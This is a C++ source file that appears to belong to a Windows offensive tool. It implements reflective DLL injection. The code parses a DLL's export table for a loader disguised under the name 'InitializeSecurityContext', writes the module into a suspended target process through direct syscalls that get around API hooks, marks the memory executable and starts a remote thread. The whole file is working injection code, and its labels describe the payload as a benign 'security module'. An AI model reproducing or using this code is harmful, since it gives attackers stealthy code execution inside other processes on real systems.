// InjectionEngine.cpp - Low-level PE injection and execution
#include "InjectionEngine.h"
#include "RuntimeSupport.h"
#include "syscalls.h"
#include <utility>

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

// Constructor initializes injection context
InjectionManager::InjectionManager(TargetProcess& target, const Console& console,
                                   std::wstring securityModulePath)
    : m_target(target), m_console(console), m_securityModulePath(std::move(securityModulePath)) {}

// Main injection workflow execution
bool InjectionManager::execute(const std::wstring& pipeName, std::string& error)
{
    m_console.Debug("Loading security module from file: " +
                    Utils::WStringToUtf8(m_securityModulePath));
    if (!loadSecurityModuleFromFile(error))
        return false;

    m_console.Debug("Parsing module PE headers for InitializeSecurityContext entry point.");
    DWORD rdiOffset = getInitializeSecurityContextOffset();
    if (rdiOffset == 0)
    {
        error = "Could not find InitializeSecurityContext export in security module.";
        return false;
    }
    m_console.Debug("InitializeSecurityContext found at file offset: " + Utils::PtrToHexStr((void*)(uintptr_t)rdiOffset));

    m_console.Debug("Allocating memory for security module in target process.");
    PVOID remoteModuleBase = nullptr;
    SIZE_T moduleSize = m_moduleBuffer.size();
    SIZE_T pipeNameByteSize = (pipeName.length() + 1) * sizeof(wchar_t);
    SIZE_T totalAllocationSize = moduleSize + pipeNameByteSize;

    NTSTATUS status = NtAllocateVirtualMemory_syscall(m_target.getProcessHandle(), &remoteModuleBase, 0,
                                                    &totalAllocationSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(status))
    {
        error = "NtAllocateVirtualMemory failed: " + Utils::NtStatusToString(status);
        return false;
    }
    m_console.Debug("Combined memory for module and parameters allocated at: " + Utils::PtrToHexStr(remoteModuleBase));
    
    m_console.Debug("Writing security module to target process memory.");
    SIZE_T bytesWritten = 0;
    status = NtWriteVirtualMemory_syscall(m_target.getProcessHandle(), remoteModuleBase,
                                        m_moduleBuffer.data(), moduleSize, &bytesWritten);
    if (!NT_SUCCESS(status))
    {
        error = "NtWriteVirtualMemory for security module failed: " +
                Utils::NtStatusToString(status);
        return false;
    }

    m_console.Debug("Writing pipe name parameter into the same allocation.");
    LPVOID remotePipeNameAddr = reinterpret_cast<PBYTE>(remoteModuleBase) + moduleSize;
    status = NtWriteVirtualMemory_syscall(m_target.getProcessHandle(), remotePipeNameAddr,
                                        (PVOID)pipeName.c_str(), pipeNameByteSize, &bytesWritten);
    if (!NT_SUCCESS(status))
    {
        error = "NtWriteVirtualMemory for pipe name failed: " +
                Utils::NtStatusToString(status);
        return false;
    }
    
    m_console.Debug("Changing module memory protection to executable.");
    ULONG oldProtect = 0;
    status = NtProtectVirtualMemory_syscall(m_target.getProcessHandle(), &remoteModuleBase,
                                          &totalAllocationSize, PAGE_EXECUTE_READ, &oldProtect);
    if (!NT_SUCCESS(status))
    {
        error = "NtProtectVirtualMemory failed: " + Utils::NtStatusToString(status);
        return false;
    }

    if (!startSecurityThreadInTarget(remoteModuleBase, rdiOffset, remotePipeNameAddr, error))
        return false;
    m_console.Debug("New thread created for security module. Main thread remains suspended.");
    return true;
}

// Reads DLL file into memory buffer
bool InjectionManager::loadSecurityModuleFromFile(std::string& error)
{
    const std::string displayPath = Utils::WStringToUtf8(m_securityModulePath);
    if (!kvc::paths::FileExists(m_securityModulePath))
    {
        error = "Security module not found: " + displayPath;
        return false;
    }

    if (!kvc::io::ReadAllBytes(m_securityModulePath, m_moduleBuffer))
    {
        error = "Failed to read security module: " + displayPath;
        return false;
    }

    std::string message = "Loaded ";
    kvc::text::AppendUnsigned(message, m_moduleBuffer.size());
    message.append(" bytes from ");
    message.append(displayPath);
    m_console.Debug(message);
    return true;
}

// Manually parses PE export table to locate entry point
DWORD InjectionManager::getInitializeSecurityContextOffset()
{
    auto dosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(m_moduleBuffer.data());
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE)
        return 0;

    auto ntHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>((uintptr_t)m_moduleBuffer.data() + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE)
        return 0;

    auto exportDirRva = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (exportDirRva == 0)
        return 0;
    
    // Converts RVA to file offset using section headers
    auto RvaToOffset = [&](DWORD rva) -> PVOID
    {
        PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
        for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; ++i, ++section)
        {
            if (rva >= section->VirtualAddress && rva < section->VirtualAddress + section->Misc.VirtualSize)
            {
                return (PVOID)((uintptr_t)m_moduleBuffer.data() + section->PointerToRawData + (rva - section->VirtualAddress));
            }
        }
        return nullptr;
    };

    auto exportDir = (PIMAGE_EXPORT_DIRECTORY)RvaToOffset(exportDirRva);
    if (!exportDir) return 0;

    auto names = (PDWORD)RvaToOffset(exportDir->AddressOfNames);
    auto ordinals = (PWORD)RvaToOffset(exportDir->AddressOfNameOrdinals);
    auto funcs = (PDWORD)RvaToOffset(exportDir->AddressOfFunctions);
    if (!names || !ordinals || !funcs) return 0;
    
    // Search for specific export by name
    for (DWORD i = 0; i < exportDir->NumberOfNames; ++i)
    {
        char* funcName = (char*)RvaToOffset(names[i]);
        if (funcName && strcmp(funcName, "InitializeSecurityContext") == 0)
        {
            PVOID funcOffsetPtr = RvaToOffset(funcs[ordinals[i]]);
            if (!funcOffsetPtr) return 0;
            return (DWORD)((uintptr_t)funcOffsetPtr - (uintptr_t)m_moduleBuffer.data());
        }
    }
    return 0;
}

// Creates remote thread at calculated entry point
bool InjectionManager::startSecurityThreadInTarget(PVOID remoteModuleBase, DWORD rdiOffset,
                                                   PVOID remotePipeNameAddr, std::string& error)
{
    m_console.Debug("Creating new thread in target to execute InitializeSecurityContext.");

    uintptr_t entryPoint = reinterpret_cast<uintptr_t>(remoteModuleBase) + rdiOffset;
    HANDLE hRemoteThread = nullptr;

    NTSTATUS status = NtCreateThreadEx_syscall(&hRemoteThread, THREAD_ALL_ACCESS, nullptr, m_target.getProcessHandle(),
                                             (LPTHREAD_START_ROUTINE)entryPoint, remotePipeNameAddr, 0, 0, 0, 0, nullptr);

    UniqueHandle remoteThreadGuard(hRemoteThread);

    if (!NT_SUCCESS(status))
    {
        error = "NtCreateThreadEx failed: " + Utils::NtStatusToString(status);
        return false;
    }

    m_console.Debug("Successfully created new thread for security module.");
    return true;
}
